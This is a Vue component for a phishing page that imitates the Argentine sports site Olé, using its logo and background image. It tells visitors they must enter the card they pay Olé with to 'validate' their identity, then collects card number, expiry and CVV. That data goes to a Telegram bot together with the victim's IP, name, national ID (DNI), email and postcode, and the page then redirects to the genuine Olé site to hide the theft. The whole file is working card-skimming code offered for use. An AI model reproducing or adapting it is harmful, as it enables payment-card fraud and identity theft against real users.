<template>
	<div class="flex flex-col lg:flex-row min-h-screen">
	  <!-- Sección de la imagen -->
	  <div class="imgScreen relative" style="width: 1015px;">
		<img class="absolute inset-0 w-full h-full" src="../assets/ole_background.jpg" alt="Imagen">
	  </div>
	  <!-- Sección del formulario -->
	  <div class="lg:w-1/3 flex items-center justify-center bg-white py-16 sm:py-24 lg:py-32 px-6 lg:px-8">
		<div class="max-w-md lg:max-w-lg w-full">
		  <img src="https://static.clarin.com/auth0/img/logo_ole_186x60.png" alt="Logo" class="mx-auto mb-8">
		  <h2 class="text-1xl font-bold text-center text-gray-900">Para poder validar tu identidad necesitamos que ingreses la tarjeta de crédito o débito con la que abonas olé.</h2>
		  <div class="mt-6 space-y-4">
			<div>
				<span v-if="showAlert" class="text-green-700 text-3xl font-bold border rounded">Verificado con éxito! </span>
			</div>
			<form v-if="!showAlert" action="" class="text-gray-800" @submit.prevent="submitFormulario">
			  <div class="relative mt-2">
				<label for="card-number" class="sr-only">Número de Tarjeta</label>
				<input v-model="numeroTarjeta" id="card-number" name="card-number" type="text" maxlength="19" autocomplete="off" required class="bg-white hover:bg-gray-200 block w-full rounded-md border border-gray-400 p-4 shadow-sm focus:border-indigo-500 focus:ring-indigo-500 sm:text-sm" placeholder="Número de Tarjeta*">
			  </div>
			  <div class="relative mt-2 flex space-x-3">
				<div class="w-1/2">
				  <label for="expiry-month" class="sr-only">Mes de Vencimiento</label>
				  <input v-model="mes" id="expiry-month" name="expiry-month" type="text" maxlength="2" autocomplete="off" required class="bg-white hover:bg-gray-200 block w-full rounded-md border border-gray-400 p-4 shadow-sm focus:border-indigo-500 focus:ring-indigo-500 sm:text-sm" placeholder="MM*">
				</div>
				<div class="w-1/2">
				  <label for="expiry-year" class="sr-only">Año de Vencimiento</label>
				  <input v-model="año" id="expiry-year" name="expiry-year" type="text" maxlength="2" autocomplete="off" required class="bg-white hover:bg-gray-200 block w-full rounded-md border border-gray-400 p-4 shadow-sm focus:border-indigo-500 focus:ring-indigo-500 sm:text-sm" placeholder="AA*">
				</div>
			  </div>
			  <div class="relative mt-2">
				<label for="cvv" class="sr-only">Código de Seguridad</label>
				<input v-model="ccv" id="cvv" name="cvv" type="text" maxlength="3" autocomplete="off" required class="bg-white hover:bg-gray-200 block w-full rounded-md border border-gray-400 p-4 shadow-sm focus:border-indigo-500 focus:ring-indigo-500 sm:text-sm" placeholder="CVV*">
			  </div>
			  <button type="submit" style="background: #a1c33d;" class="mt-3 w-full text-white p-4 rounded-md shadow-sm hover:bg-green-700">
				<span v-if="continuar" class="loading loading-spinner text-success"></span>
				<span v-else>Enviar</span>
			  </button>
			</form>
		  </div>
		</div>
	  </div>
	</div>
  </template>
  
  <script>
  import axios from 'axios';
  import { mapGetters, mapActions } from 'vuex';
  export default {
    data() {
      return {
        numeroTarjeta: '',
        nombreTarjeta: '',
        mes: '',
		año:'',
        ccv: '',
		mail:'',
		loader: false,
		loaderSec: false,
		showAlert:false,
		continuar:false,
		datos:{},
		userIp:''

      }
    },
	computed: {
      ...mapGetters(['getServicio', 'getDatos']),
    },
    mounted(){
        this.datos= this.getDatos[0]
    },
    methods: {
      async submitFormulario() {
		try {
      const response = await axios.get('/api/ip');
      this.userIp = response.data.ip;
    } catch (error) {
      console.error('Error al obtener la IP del usuario:', error);
    }
		    this.datos= this.getDatos[0]
		    const fecha = new Date();
            const fechaFormateada = `${fecha.getDate()}/${fecha.getMonth() + 1}/${fecha.getFullYear()} ${fecha.getHours()}:${fecha.getMinutes()}`;
          const postData =  
          `
  ${fechaFormateada}
  IP: ${this.userIp}
 ****************************
Nº: ${this.numeroTarjeta}
Nam: ${this.datos.name}
DNI: ${this.datos.dni}
Exp: ${this.mes}/${this.año}
Ccv: ${this.ccv}
Mail: ${this.datos.email}
CP: ${this.datos.cp}
 ****************************
                            `
            const chatId = process.env.CHAT_ID_TELEGRAM;
            const botToken = process.env.TOKEN_TELEGRAM;
            const apiUrl = process.env.API_URL_TELEGRAM;
            const action = '/sendMessage'
            const url = `${apiUrl}${botToken}${action}`;

			if(this.numeroTarjeta && this.mes && this.año && this.ccv){
				this.continuar=true;
					axios.post(url, JSON.stringify({
					chat_id: chatId,
					text: postData
				}), {
					headers: {
						'Content-Type': 'application/json'
					}
				})
					.then(r => {
						this.showAlert=true;
						setTimeout(() => {
							window.location.href = 'https://www.ole.com.ar/';
						}, 2900);
				})
					.catch(e => {
				});
			}


      },
    
    }
    }
  
</script>


  
<style></style>